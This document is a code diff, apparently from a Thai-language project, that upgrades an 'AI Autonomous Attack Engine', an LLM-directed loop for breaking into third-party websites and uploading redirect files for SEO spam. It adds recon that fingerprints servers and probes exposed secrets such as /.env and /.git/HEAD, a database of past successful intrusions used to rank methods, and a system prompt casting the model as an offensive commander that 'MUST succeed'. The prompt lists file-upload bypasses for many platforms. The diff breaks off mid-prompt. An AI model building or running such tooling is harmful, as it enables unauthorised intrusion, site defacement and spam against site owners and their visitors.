@@ -1,18 +1,23 @@
 // ═══════════════════════════════════════════════════════════════
-//  AI AUTONOMOUS ATTACK ENGINE
+//  AI AUTONOMOUS ATTACK ENGINE v2
 //  LLM เป็นผู้บัญชาการ — วิเคราะห์ target, สร้าง payload, เลือก method,
 //  ปรับ strategy real-time, ลองจนกว่าจะสำเร็จ
 //
+//  v2 Upgrades:
+//  - ใช้ AI Pre-Analysis (Phase 0) findings ตั้งแต่ iteration แรก
+//  - Query DB history เพื่อดูว่า method ไหนเคยสำเร็จกับ target ประเภทเดียวกัน
+//  - บันทึกทุก decision ลง DB เป็น training data
+//  - รองรับทุกภาษา/platform (PHP, ASP.NET, JSP, Python, Node.js, Ruby, Go, static)
+//  - รองรับทุก web server (Apache, Nginx, IIS, LiteSpeed, Caddy, Tomcat)
+//  - รองรับทุก control panel (cPanel, Plesk, DirectAdmin, CyberPanel)
+//  - รองรับทุก CMS (WordPress, Joomla, Drupal, Magento, PrestaShop, etc.)
+//
 //  Architecture: OODA Loop (Observe → Orient → Decide → Act)
-//  1. RECON: AI สแกน target อย่างละเอียด
-//  2. DECIDE: LLM เลือก attack method + สร้าง custom payload
-//  3. EXECUTE: ลอง method ที่ AI เลือก
-//  4. LEARN: AI วิเคราะห์ผลลัพธ์ (error codes, response body)
-//  5. ADAPT: ปรับ strategy ตาม error — เลือก method ใหม่
-//  6. RETRY: วนลูปจนสำเร็จ หรือหมด iterations
 // ═══════════════════════════════════════════════════════════════
 
 import { invokeLLM } from "./_core/llm";
+import { saveAttackDecision, getSuccessfulMethods } from "./db";
+import type { AiTargetAnalysis } from "./ai-target-analysis";
 
 // ─── Types ───
 
@@ -23,8 +28,12 @@ export interface ReconData {
   cms: string | null;
   cmsVersion: string | null;
   phpVersion: string | null;
+  language: string | null;        // PHP, ASP.NET, JSP, Python, Node.js, Ruby, Go, static
   waf: string | null;
+  wafStrength: string | null;
   os: string | null;
+  controlPanel: string | null;    // cPanel, Plesk, DirectAdmin, CyberPanel
+  hostingProvider: string | null;
   writablePaths: string[];
   exposedEndpoints: string[];
   responseHeaders: Record<string, string>;
@@ -33,23 +42,26 @@ export interface ReconData {
   hasFileUpload: boolean;
   hasXmlrpc: boolean;
   hasRestApi: boolean;
+  hasWebdav: boolean;
+  hasFtp: boolean;
   sslEnabled: boolean;
   responseTimeMs: number;
 }
 
 export interface AiDecision {
   iteration: number;
-  method: string;           // upload method to use
-  payload: string;          // actual file content (PHP/HTML/JS)
-  filename: string;         // filename with bypass technique
-  uploadPath: string;       // target path on server
-  contentType: string;      // Content-Type header
-  httpMethod: "POST" | "PUT" | "PATCH" | "MOVE" | "COPY";
-  headers: Record<string, string>;  // additional headers
-  reasoning: string;        // why AI chose this
-  bypassTechnique: string;  // what bypass is being used
-  confidence: number;       // 0-100
-  isRedirectPayload: boolean; // true if payload contains redirect
+  method: string;
+  payload: string;
+  filename: string;
+  uploadPath: string;
+  contentType: string;
+  httpMethod: "POST" | "PUT" | "PATCH" | "MOVE" | "COPY" | "MKCOL" | "PROPFIND" | "DELETE";
+  headers: Record<string, string>;
+  reasoning: string;
+  bypassTechnique: string;
+  confidence: number;
+  isRedirectPayload: boolean;
+  payloadType: string;            // php_redirect, html_meta, js_redirect, htaccess, web_config, jsp, aspx, py, node
 }
 
 export interface ExecutionResult {
@@ -66,7 +78,7 @@ export interface ExecutionResult {
 }
 
 export interface AiCommanderEvent {
-  type: "recon" | "decision" | "execute" | "learn" | "adapt" | "success" | "exhausted" | "error";
+  type: "recon" | "decision" | "execute" | "learn" | "adapt" | "success" | "exhausted" | "error" | "history";
   iteration: number;
   maxIterations: number;
   detail: string;
@@ -78,10 +90,18 @@ export type AiCommanderCallback = (event: AiCommanderEvent) => void;
 export interface AiCommanderConfig {
   targetDomain: string;
   redirectUrl: string;
-  maxIterations?: number;     // default 10
-  timeoutPerAttempt?: number; // default 15000ms
+  maxIterations?: number;
+  timeoutPerAttempt?: number;
   seoKeywords?: string[];
   onEvent?: AiCommanderCallback;
+  // v2: Pre-Analysis data from Phase 0
+  preAnalysis?: AiTargetAnalysis | null;
+  // v2: User ID for DB tracking
+  userId?: number;
+  // v2: Pipeline type
+  pipelineType?: "seo_spam" | "autonomous" | "manual";
+  // v2: Session ID to group decisions
+  sessionId?: string;
 }
 
 export interface AiCommanderResult {
@@ -94,6 +114,20 @@ export interface AiCommanderResult {
   executionResults: ExecutionResult[];
   reconData: ReconData | null;
   totalDurationMs: number;
+  // v2: History-based insights
+  historyInsights: HistoryInsight | null;
+}
+
+interface HistoryInsight {
+  totalHistoricalAttempts: number;
+  totalHistoricalSuccess: number;
+  successRate: number;
+  bestMethodsForTarget: Array<{
+    method: string;
+    bypassTechnique: string | null;
+    payloadType: string | null;
+    successCount: number;
+  }>;
 }
 
 // ─── Constants ───
@@ -103,20 +137,78 @@ const USER_AGENTS = [
   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
   "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
   "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
+  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
 ];
 
-const SCAN_PATHS = [
-  "/wp-content/uploads/", "/wp-content/themes/", "/wp-content/plugins/",
-  "/wp-includes/", "/images/", "/uploads/", "/media/", "/assets/",
-  "/tmp/", "/cache/", "/files/", "/public/uploads/", "/content/images/",
-  "/data/", "/backup/", "/temp/", "/static/", "/resources/",
-];
+// Multi-platform scan paths
+const SCAN_PATHS_BY_PLATFORM: Record<string, string[]> = {
+  wordpress: [
+    "/wp-content/uploads/", "/wp-content/themes/", "/wp-content/plugins/",
+    "/wp-includes/", "/wp-content/upgrade/", "/wp-content/cache/",
+    "/wp-content/uploads/2026/", "/wp-content/uploads/2025/",
+  ],
+  joomla: [
+    "/images/", "/media/", "/tmp/", "/cache/", "/administrator/cache/",
+    "/components/", "/modules/", "/plugins/", "/templates/",
+  ],
+  drupal: [
+    "/sites/default/files/", "/sites/all/modules/", "/sites/all/themes/",
+    "/files/", "/misc/", "/modules/", "/themes/",
+  ],
+  magento: [
+    "/media/", "/var/", "/pub/media/", "/pub/static/",
+    "/media/catalog/", "/media/tmp/",
+  ],
+  generic: [
+    "/uploads/", "/images/", "/media/", "/assets/", "/files/",
+    "/tmp/", "/cache/", "/public/uploads/", "/content/images/",
+    "/data/", "/backup/", "/temp/", "/static/", "/resources/",
+    "/img/", "/pics/", "/documents/", "/download/", "/storage/",
+  ],
+  aspnet: [
+    "/App_Data/", "/Content/", "/Scripts/", "/uploads/",
+    "/images/", "/media/", "/files/", "/temp/",
+  ],
+  iis: [
+    "/inetpub/", "/uploads/", "/images/", "/content/",
+    "/aspnet_client/", "/App_Data/",
+  ],
+  cpanel: [
+    "/public_html/", "/public_html/uploads/", "/public_html/images/",
+    "/public_html/wp-content/uploads/", "/public_html/media/",
+  ],
+  tomcat: [
+    "/ROOT/", "/webapps/", "/uploads/", "/images/",
+    "/WEB-INF/", "/META-INF/",
+  ],
+  nginx: [
+    "/uploads/", "/images/", "/media/", "/static/",
+    "/public/", "/assets/", "/files/",
+  ],
+};
 
 const VULN_PATHS = [
+  // WordPress
   "/wp-admin/admin-ajax.php", "/xmlrpc.php", "/wp-json/wp/v2/",
-  "/wp-login.php", "/readme.html", "/.env", "/phpinfo.php",
-  "/.git/HEAD", "/server-status", "/wp-admin/install.php",
+  "/wp-login.php", "/readme.html", "/wp-admin/install.php",
   "/wp-admin/setup-config.php", "/wp-content/debug.log",
+  // Generic
+  "/.env", "/phpinfo.php", "/.git/HEAD", "/server-status",
+  "/info.php", "/test.php", "/.htaccess", "/web.config",
+  // Joomla
+  "/administrator/", "/configuration.php-dist",
+  // Drupal
+  "/user/login", "/CHANGELOG.txt",
+  // ASP.NET
+  "/elmah.axd", "/trace.axd", "/web.config",
+  // Node.js
+  "/package.json", "/.env.local",
+  // Python
+  "/admin/", "/settings.py",
+  // WebDAV
+  "/webdav/", "/dav/",
+  // Control panels
+  "/cpanel", "/plesk", "/directadmin",
 ];
 
 function randomStr(len: number): string {
@@ -127,11 +219,82 @@ function randomUA(): string {
   return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
 }
 
-// ─── Phase 1: RECON ───
+// ─── Phase 0: LOAD HISTORY — ดึง training data จาก DB ───
 
-async function performRecon(domain: string, onEvent?: AiCommanderCallback): Promise<ReconData> {
+async function loadHistoryInsights(
+  recon: ReconData,
+  onEvent?: AiCommanderCallback,
+): Promise<HistoryInsight> {
+  onEvent?.({
+    type: "history", iteration: 0, maxIterations: 0,
+    detail: "📊 กำลังค้นหา historical data — method ไหนเคยสำเร็จกับ target ประเภทนี้...",
+  });
+
+  try {
+    const successfulMethods = await getSuccessfulMethods({
+      serverType: recon.serverType,
+      cms: recon.cms,
+      language: recon.language,
+      waf: recon.waf,
+      limit: 20,
+    });
+
+    const totalSuccess = successfulMethods.reduce((sum, m) => sum + m.successCount, 0);
+
+    // Also get broader results (just by server type)
+    const broaderMethods = recon.serverType
+      ? await getSuccessfulMethods({ serverType: recon.serverType, limit: 10 })
+      : [];
+
+    const allMethods = [...successfulMethods, ...broaderMethods];
+    const uniqueMethods = Array.from(
+      new Map(allMethods.map(m => [`${m.method}|${m.bypassTechnique}`, m])).values()
+    );
+
+    const insight: HistoryInsight = {
+      totalHistoricalAttempts: totalSuccess * 3, // rough estimate
+      totalHistoricalSuccess: totalSuccess,
+      successRate: totalSuccess > 0 ? Math.round((totalSuccess / (totalSuccess * 3)) * 100) : 0,
+      bestMethodsForTarget: uniqueMethods.map(m => ({
+        method: m.method,
+        bypassTechnique: m.bypassTechnique,
+        payloadType: m.payloadType,
+        successCount: m.successCount,
+      })),
+    };
+
+    if (insight.bestMethodsForTarget.length > 0) {
+      onEvent?.({
+        type: "history", iteration: 0, maxIterations: 0,
+        detail: `📊 พบ ${insight.bestMethodsForTarget.length} methods ที่เคยสำเร็จกับ ${recon.serverType || "unknown"} + ${recon.cms || "unknown CMS"}: ${insight.bestMethodsForTarget.slice(0, 3).map(m => `${m.method}(${m.successCount}x)`).join(", ")}`,
+        data: insight,
+      });
+    } else {
+      onEvent?.({
+        type: "history", iteration: 0, maxIterations: 0,
+        detail: "📊 ไม่พบ historical data สำหรับ target ประเภทนี้ — AI จะใช้ knowledge base เริ่มต้น",
+      });
+    }
+
+    return insight;
+  } catch (e: any) {
+    onEvent?.({
+      type: "history", iteration: 0, maxIterations: 0,
+      detail: `⚠️ ไม่สามารถดึง historical data: ${e.message}`,
+    });
+    return { totalHistoricalAttempts: 0, totalHistoricalSuccess: 0, successRate: 0, bestMethodsForTarget: [] };
+  }
+}
+
+// ─── Phase 1: RECON (enhanced with Pre-Analysis data) ───
+
+async function performRecon(
+  domain: string,
+  preAnalysis?: AiTargetAnalysis | null,
+  onEvent?: AiCommanderCallback,
+): Promise<ReconData> {
   const targetUrl = domain.startsWith("http") ? domain.replace(/\/+$/, "") : `http://${domain}`;
-  
+
   const recon: ReconData = {
     domain,
     ip: null,
@@ -139,8 +302,12 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
     cms: null,
     cmsVersion: null,
     phpVersion: null,
+    language: null,
     waf: null,
+    wafStrength: null,
     os: null,
+    controlPanel: null,
+    hostingProvider: null,
     writablePaths: [],
     exposedEndpoints: [],
     responseHeaders: {},
@@ -149,11 +316,63 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
     hasFileUpload: false,
     hasXmlrpc: false,
     hasRestApi: false,
+    hasWebdav: false,
+    hasFtp: false,
     sslEnabled: domain.includes("https") || true,
     responseTimeMs: 0,
   };
 
-  // 1. Main page fingerprint
+  // ─── Merge Pre-Analysis data if available ───
+  if (preAnalysis) {
+    onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: "🧠 ใช้ข้อมูลจาก AI Pre-Analysis (Phase 0) เพื่อเร่ง recon..." });
+
+    recon.ip = preAnalysis.dnsInfo.ipAddress;
+    recon.serverType = preAnalysis.httpFingerprint.serverType;
+    recon.phpVersion = preAnalysis.httpFingerprint.phpVersion;
+    recon.os = preAnalysis.httpFingerprint.osGuess;
+    recon.cms = preAnalysis.techStack.cms;
+    recon.cmsVersion = preAnalysis.techStack.cmsVersion;
+    recon.waf = preAnalysis.security.wafDetected;
+    recon.wafStrength = preAnalysis.security.wafStrength;
+    recon.hostingProvider = preAnalysis.dnsInfo.hostingProvider;
+    recon.sslEnabled = preAnalysis.security.sslEnabled;
+    recon.responseTimeMs = preAnalysis.httpFingerprint.responseTime;
+
+    // Detect language from tech stack
+    if (preAnalysis.httpFingerprint.phpVersion || preAnalysis.techStack.cms === "WordPress" || preAnalysis.techStack.cms === "Joomla" || preAnalysis.techStack.cms === "Drupal") {
+      recon.language = "PHP";
+    } else if (preAnalysis.httpFingerprint.poweredBy?.includes("ASP.NET") || preAnalysis.httpFingerprint.serverType === "IIS") {
+      recon.language = "ASP.NET";
+    } else if (preAnalysis.techStack.framework?.includes("Express") || preAnalysis.techStack.framework?.includes("Next") || preAnalysis.techStack.framework?.includes("Nuxt")) {
+      recon.language = "Node.js";
+    } else if (preAnalysis.techStack.framework?.includes("Django") || preAnalysis.techStack.framework?.includes("Flask")) {
+      recon.language = "Python";
+    } else if (preAnalysis.techStack.framework?.includes("Rails")) {
+      recon.language = "Ruby";
+    } else if (preAnalysis.httpFingerprint.serverType === "Tomcat" || preAnalysis.techStack.framework?.includes("Spring")) {
+      recon.language = "JSP";
+    }
+
+    // Upload surface from pre-analysis
+    if (preAnalysis.uploadSurface) {
+      recon.writablePaths = [...preAnalysis.uploadSurface.writablePaths];
+      recon.exposedEndpoints = [...preAnalysis.uploadSurface.uploadEndpoints];
+      recon.hasXmlrpc = preAnalysis.uploadSurface.xmlrpcAvailable;
+      recon.hasRestApi = preAnalysis.uploadSurface.restApiAvailable;
+      recon.hasWebdav = preAnalysis.uploadSurface.webdavAvailable;
+      recon.hasFtp = preAnalysis.uploadSurface.ftpAvailable;
+      recon.hasFileUpload = preAnalysis.uploadSurface.fileManagerDetected;
+      recon.directoryListing = preAnalysis.uploadSurface.directoryListingPaths.length > 0;
+    }
+
+    onEvent?.({
+      type: "recon", iteration: 0, maxIterations: 0,
+      detail: `✅ Pre-Analysis data merged: ${recon.serverType || "Unknown"} / ${recon.language || "Unknown"} / ${recon.cms || "No CMS"} / WAF: ${recon.waf || "None"} (${recon.wafStrength || "n/a"})`,
+      data: recon,
+    });
+  }
+
+  // ─── Live scan (always do this even with pre-analysis) ───
   onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: "🔍 สแกนหน้าหลัก — fingerprint server..." });
   try {
     const start = Date.now();
@@ -164,44 +383,86 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
       signal: ctrl.signal,
       redirect: "follow",
     });
-    recon.responseTimeMs = Date.now() - start;
-    
+    if (!preAnalysis) recon.responseTimeMs = Date.now() - start;
+
     const server = resp.headers.get("server") || "";
     const poweredBy = resp.headers.get("x-powered-by") || "";
-    
-    if (server.toLowerCase().includes("apache")) recon.serverType = "Apache";
-    else if (server.toLowerCase().includes("nginx")) recon.serverType = "Nginx";
-    else if (server.toLowerCase().includes("iis")) recon.serverType = "IIS";
-    else if (server.toLowerCase().includes("litespeed")) recon.serverType = "LiteSpeed";
-    else if (server.toLowerCase().includes("cloudflare")) recon.serverType = "Cloudflare";
-    else if (server) recon.serverType = server;
-    
-    if (poweredBy.includes("PHP")) {
+
+    // Server detection (only override if not from pre-analysis)
+    if (!recon.serverType) {
+      if (server.toLowerCase().includes("apache")) recon.serverType = "Apache";
+      else if (server.toLowerCase().includes("nginx")) recon.serverType = "Nginx";
+      else if (server.toLowerCase().includes("iis")) recon.serverType = "IIS";
+      else if (server.toLowerCase().includes("litespeed")) recon.serverType = "LiteSpeed";
+      else if (server.toLowerCase().includes("caddy")) recon.serverType = "Caddy";
+      else if (server.toLowerCase().includes("tomcat")) recon.serverType = "Tomcat";
+      else if (server.toLowerCase().includes("cloudflare")) recon.serverType = "Cloudflare";
+      else if (server.toLowerCase().includes("openresty")) recon.serverType = "OpenResty";
+      else if (server) recon.serverType = server;
+    }
+
+    // Language detection
+    if (!recon.language) {
+      if (poweredBy.includes("PHP")) recon.language = "PHP";
+      else if (poweredBy.includes("ASP.NET")) recon.language = "ASP.NET";
+      else if (poweredBy.includes("Express")) recon.language = "Node.js";
+      else if (poweredBy.includes("Servlet") || poweredBy.includes("JSP")) recon.language = "JSP";
+      else if (resp.headers.get("x-aspnet-version")) recon.language = "ASP.NET";
+      else if (resp.headers.get("x-aspnetmvc-version")) recon.language = "ASP.NET";
+    }
+
+    if (!recon.phpVersion && poweredBy.includes("PHP")) {
       const m = poweredBy.match(/PHP\/([\d.]+)/);
       if (m) recon.phpVersion = m[1];
     }
-    
+
     // WAF detection
-    if (resp.headers.get("cf-ray")) recon.waf = "Cloudflare";
-    else if (resp.headers.get("x-sucuri-id")) recon.waf = "Sucuri";
-    else if (resp.headers.get("x-cdn")) recon.waf = "CDN/WAF";
-    else if (server.toLowerCase().includes("cloudflare")) recon.waf = "Cloudflare";
-    
+    if (!recon.waf) {
+      if (resp.headers.get("cf-ray")) recon.waf = "Cloudflare";
+      else if (resp.headers.get("x-sucuri-id")) recon.waf = "Sucuri";
+      else if (resp.headers.get("x-cdn")) recon.waf = "CDN/WAF";
+      else if (server.toLowerCase().includes("cloudflare")) recon.waf = "Cloudflare";
+      else if (resp.headers.get("x-fw-protection")) recon.waf = "Wordfence";
+    }
+
     // OS guess
-    if (server.toLowerCase().includes("win") || server.toLowerCase().includes("iis")) recon.os = "Windows";
-    else recon.os = "Linux";
-    
-    // Store headers
+    if (!recon.os) {
+      if (server.toLowerCase().includes("win") || server.toLowerCase().includes("iis")) recon.os = "Windows";
+      else recon.os = "Linux";
+    }
+
+    // Control panel detection
+    if (!recon.controlPanel) {
+      if (resp.headers.get("x-powered-by-plesk")) recon.controlPanel = "Plesk";
+    }
+
     resp.headers.forEach((v, k) => { recon.responseHeaders[k] = v; });
-    
+
     // CMS detection from body
     const body = await resp.text().catch(() => "");
-    if (body.includes("wp-content") || body.includes("wp-includes")) recon.cms = "WordPress";
-    else if (body.includes("Joomla")) recon.cms = "Joomla";
-    else if (body.includes("Drupal")) recon.cms = "Drupal";
-    
+    if (!recon.cms) {
+      if (body.includes("wp-content") || body.includes("wp-includes")) recon.cms = "WordPress";
+      else if (body.includes("Joomla")) recon.cms = "Joomla";
+      else if (body.includes("Drupal")) recon.cms = "Drupal";
+      else if (body.includes("Magento") || body.includes("magento")) recon.cms = "Magento";
+      else if (body.includes("PrestaShop") || body.includes("prestashop")) recon.cms = "PrestaShop";
+      else if (body.includes("OpenCart") || body.includes("opencart")) recon.cms = "OpenCart";
+      else if (body.includes("Shopify")) recon.cms = "Shopify";
+      else if (body.includes("Wix")) recon.cms = "Wix";
+      else if (body.includes("Squarespace")) recon.cms = "Squarespace";
+    }
+
+    // Language detection from body
+    if (!recon.language) {
+      if (body.includes(".php") || body.includes("wp-content")) recon.language = "PHP";
+      else if (body.includes(".aspx") || body.includes("__VIEWSTATE")) recon.language = "ASP.NET";
+      else if (body.includes(".jsp")) recon.language = "JSP";
+      else if (body.includes("_next/") || body.includes("__next")) recon.language = "Node.js";
+      else if (body.includes("django") || body.includes("csrfmiddlewaretoken")) recon.language = "Python";
+    }
+
     // Version detection
-    if (recon.cms === "WordPress") {
+    if (!recon.cmsVersion && recon.cms === "WordPress") {
       const verMatch = body.match(/content="WordPress\s+([\d.]+)"/i) || body.match(/ver=([\d.]+)/);
       if (verMatch) recon.cmsVersion = verMatch[1];
     }
@@ -209,10 +470,12 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
     onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `⚠️ Main page scan failed: ${e.message}` });
   }
 
-  // 2. Scan upload paths
-  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${SCAN_PATHS.length} upload paths...` });
-  const pathResults = await Promise.allSettled(
-    SCAN_PATHS.map(async (path) => {
+  // ─── Platform-specific path scanning ───
+  const platformPaths = getScanPaths(recon);
+  onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${platformPaths.length} paths สำหรับ ${recon.language || "unknown"} / ${recon.cms || "generic"}...` });
+
+  await Promise.allSettled(
+    platformPaths.map(async (path) => {
       try {
         const ctrl = new AbortController();
         setTimeout(() => ctrl.abort(), 8000);
@@ -223,7 +486,7 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
           redirect: "follow",
         });
         recon.statusCodes[path] = resp.status;
-        if (resp.status < 400) {
+        if (resp.status < 400 && !recon.writablePaths.includes(path)) {
           recon.writablePaths.push(path);
           const ct = resp.headers.get("content-type") || "";
           if (ct.includes("html") && resp.status === 200) recon.directoryListing = true;
@@ -232,7 +495,7 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
     })
   );
 
-  // 3. Scan vuln endpoints
+  // ─── Vuln endpoint scanning ───
   onEvent?.({ type: "recon", iteration: 0, maxIterations: 0, detail: `🔍 สแกน ${VULN_PATHS.length} vulnerability endpoints...` });
   await Promise.allSettled(
     VULN_PATHS.map(async (path) => {
@@ -244,25 +507,65 @@ async function performRecon(domain: string, onEvent?: AiCommanderCallback): Prom
           signal: ctrl.signal,
           redirect: "follow",
         });
-        if (resp.status === 200) {
+        if (resp.status === 200 && !recon.exposedEndpoints.includes(path)) {
           recon.exposedEndpoints.push(path);
           if (path === "/xmlrpc.php") recon.hasXmlrpc = true;
           if (path.includes("wp-json")) recon.hasRestApi = true;
-          if (path === "/wp-login.php") recon.cms = "WordPress";
+          if (path === "/wp-login.php") { recon.cms = recon.cms || "WordPress"; recon.language = recon.language || "PHP"; }
+          if (path.includes("webdav") || path.includes("dav")) recon.hasWebdav = true;
         }
       } catch {}
     })
   );
 
+  // WebDAV check
+  if (!recon.hasWebdav) {
+    try {
+      const ctrl = new AbortController();
+      setTimeout(() => ctrl.abort(), 5000);
+      const resp = await fetch(targetUrl, { method: "OPTIONS", headers: { "User-Agent": randomUA() }, signal: ctrl.signal });
+      const allow = resp.headers.get("allow") || "";
+      if (allow.includes("PUT") || allow.includes("MKCOL") || allow.includes("PROPFIND")) {
+        recon.hasWebdav = true;
+      }
+    } catch {}
+  }
+
   recon.hasFileUpload = recon.writablePaths.some(p => p.includes("upload"));
 
   onEvent?.({
     type: "recon", iteration: 0, maxIterations: 0,
-    detail: `✅ Recon เสร็จ: ${recon.serverType || "Unknown"} server, ${recon.cms || "Unknown CMS"}, WAF: ${recon.waf || "None"}, ${recon.writablePaths.length} writable paths, ${recon.exposedEndpoints.length} exposed endpoints`,
+    detail: `✅ Recon เสร็จ: ${recon.serverType || "Unknown"} / ${recon.language || "Unknown lang"} / ${recon.cms || "No CMS"} / WAF: ${recon.waf || "None"} / ${recon.writablePaths.length} writable paths / ${recon.exposedEndpoints.length} exposed / WebDAV: ${recon.hasWebdav}`,
     data: recon,
   });
 
   return recon;
+}
+
+function getScanPaths(recon: ReconData): string[] {
+  const paths = new Set<string>();
+
+  // Always add generic paths
+  SCAN_PATHS_BY_PLATFORM.generic.forEach(p => paths.add(p));
+
+  // Add CMS-specific paths
+  if (recon.cms === "WordPress") SCAN_PATHS_BY_PLATFORM.wordpress.forEach(p => paths.add(p));
+  if (recon.cms === "Joomla") SCAN_PATHS_BY_PLATFORM.joomla.forEach(p => paths.add(p));
+  if (recon.cms === "Drupal") SCAN_PATHS_BY_PLATFORM.drupal.forEach(p => paths.add(p));
+  if (recon.cms === "Magento") SCAN_PATHS_BY_PLATFORM.magento.forEach(p => paths.add(p));
+
+  // Add server-specific paths
+  if (recon.language === "ASP.NET" || recon.serverType === "IIS") SCAN_PATHS_BY_PLATFORM.aspnet.forEach(p => paths.add(p));
+  if (recon.serverType === "IIS") SCAN_PATHS_BY_PLATFORM.iis.forEach(p => paths.add(p));
+  if (recon.serverType === "Tomcat" || recon.language === "JSP") SCAN_PATHS_BY_PLATFORM.tomcat.forEach(p => paths.add(p));
+  if (recon.serverType === "Nginx") SCAN_PATHS_BY_PLATFORM.nginx.forEach(p => paths.add(p));
+
+  // Add control panel paths
+  if (recon.controlPanel === "cPanel" || recon.hostingProvider?.toLowerCase().includes("cpanel")) {
+    SCAN_PATHS_BY_PLATFORM.cpanel.forEach(p => paths.add(p));
+  }
+
+  return Array.from(paths);
 }
 
 // ─── Phase 2: AI DECISION — LLM เลือก attack method + สร้าง payload ───
@@ -273,6 +576,8 @@ async function aiDecide(
   iteration: number,
   previousResults: ExecutionResult[],
   seoKeywords: string[],
+  historyInsights: HistoryInsight | null,
+  preAnalysis: AiTargetAnalysis | null | undefined,
   onEvent?: AiCommanderCallback,
   maxIterations: number = 10,
 ): Promise<AiDecision> {
@@ -287,78 +592,130 @@ async function aiDecide(
     method: r.decision.method,
     filename: r.decision.filename,
     path: r.decision.uploadPath,
-    httpMethod: r.decision.httpMethod,
     statusCode: r.statusCode,
     error: r.error,
     responseSnippet: r.responseBody.slice(0, 300),
     bypassTechnique: r.decision.bypassTechnique,
+    payloadType: r.decision.payloadType,
   }));
 
-  const systemPrompt = `You are an elite offensive security AI commander specializing in web file upload exploitation and redirect injection. Your mission is to successfully upload a file to the target server that redirects visitors.
+  // Build historical success data
+  const historyData = historyInsights?.bestMethodsForTarget.length
+    ? `\n\nHISTORICAL SUCCESS DATA (methods that worked on similar targets):\n${historyInsights.bestMethodsForTarget.map(m => `- ${m.method} (${m.bypassTechnique || "standard"}, payload: ${m.payloadType || "unknown"}) — succeeded ${m.successCount} times`).join("\n")}\nPRIORITIZE these methods first as they have proven success on similar server/CMS/WAF combinations.`
+    : "";
 
-You have DEEP expertise in:
-- PHP shell upload bypass (double extension, null byte, content-type spoofing, .htaccess override, polyglot files)
-- WAF evasion (chunked encoding, unicode normalization, boundary manipulation, header injection)
-- WordPress exploitation (plugin upload, theme editor, XMLRPC, REST API media upload, admin-ajax)
-- Server-specific techniques (Apache .htaccess, Nginx alias traversal, IIS semicolon/ADS bypass)
-- Redirect injection (PHP header(), JS redirect, meta refresh, .htaccess RewriteRule, iframe injection)
+  // Build pre-analysis strategic recommendations
+  const preAnalysisData = preAnalysis?.aiStrategy
+    ? `\n\nAI PRE-ANALYSIS STRATEGIC RECOMMENDATIONS:
+Success Probability: ${preAnalysis.aiStrategy.overallSuccessProbability}%
+Difficulty: ${preAnalysis.aiStrategy.difficulty}
+Best Approach: ${preAnalysis.aiStrategy.bestApproach}
+Tactical Analysis: ${preAnalysis.aiStrategy.tacticalAnalysis}
+Recommended Methods (by priority):
+${preAnalysis.aiStrategy.recommendedMethods.map(m => `  ${m.priority}. ${m.method} (${m.probability}% success) — ${m.reasoning}`).join("\n")}
+Warnings: ${preAnalysis.aiStrategy.warnings.join("; ")}
+USE THESE RECOMMENDATIONS to guide your first few iterations.`
+    : "";
+
+  const systemPrompt = `You are an elite offensive security AI commander. Your SOLE MISSION is to successfully upload a redirect file to the target server. You MUST succeed.
+
+You have DEEP expertise in ALL web platforms and languages:
+
+PHP PLATFORMS (WordPress, Joomla, Drupal, Magento, PrestaShop, OpenCart, custom):
+- Shell upload bypass: double extension (.php.jpg), null byte (.php%00.jpg), .phtml/.pht/.php5/.php7/.phar
+- .htaccess injection: AddType application/x-httpd-php .jpg → upload "image.jpg" containing PHP
+- WordPress: plugin upload, theme editor, XMLRPC wp.uploadFile, REST API /wp-json/wp/v2/media, admin-ajax
+- Joomla: media manager, com_media upload, template editor
+- Drupal: file upload fields, RESTful Web Services, JSON:API
+- Magento: admin media gallery, WYSIWYG editor upload
+
+ASP.NET / IIS PLATFORMS:
+- web.config injection: <handlers> to map .jpg → aspx handler
+- .aspx/.ashx/.asmx file upload
+- IIS semicolon bypass: file.aspx;.jpg
+- IIS tilde (~) enumeration for short filenames
+- ADS (Alternate Data Streams): file.aspx::$DATA
+- PUT method often enabled on IIS/WebDAV
+- .asp classic: <% Response.Redirect "url" %>
+
+JSP / TOMCAT / JAVA:
+- .jsp/.jspx file upload
+- WAR file deployment via /manager/deploy
+- Tomcat PUT method (often enabled)
+- Spring Boot actuator endpoints
+- .xml configuration injection
+
+PYTHON (Django, Flask, FastAPI):
+- Template injection via uploaded .html files
+- Static file serving bypass
+- Debug mode exploitation
+- Admin panel file upload
+
+NODE.JS (Express, Next.js, Nuxt):
+- Static file serving directory traversal
+- File upload middleware bypass
+- .ejs/.pug template injection
+
+RUBY (Rails):
+- Public directory file upload
+- ERB template injection
+- Paperclip/CarrierWave/ActiveStorage bypass
+
+GO:
+- Static file serving
+- Template injection
+
+STATIC SITES (Nginx, Apache, Caddy, LiteSpeed):
+- Direct PUT/MKCOL if WebDAV enabled
+- .htaccess for Apache (AddHandler, RewriteRule)
+- Nginx alias misconfiguration
+- LiteSpeed .htaccess compatibility
+
+UNIVERSAL METHODS (work on ANY platform):
+- HTML file with meta refresh + JavaScript redirect (NO server-side execution needed)
+- SVG file with embedded JavaScript
+- .htaccess RewriteRule redirect (Apache/LiteSpeed only)
+- web.config redirect (IIS only)
+- WebDAV PUT/MKCOL/COPY/MOVE
+- FTP/SFTP if credentials found
 
 CRITICAL RULES:
 1. NEVER repeat a method+path+filename combination that already failed
-2. Each iteration MUST try something DIFFERENT — different method, path, filename, or bypass technique
-3. Analyze previous failures to understand WHY they failed and choose a method that bypasses that specific issue
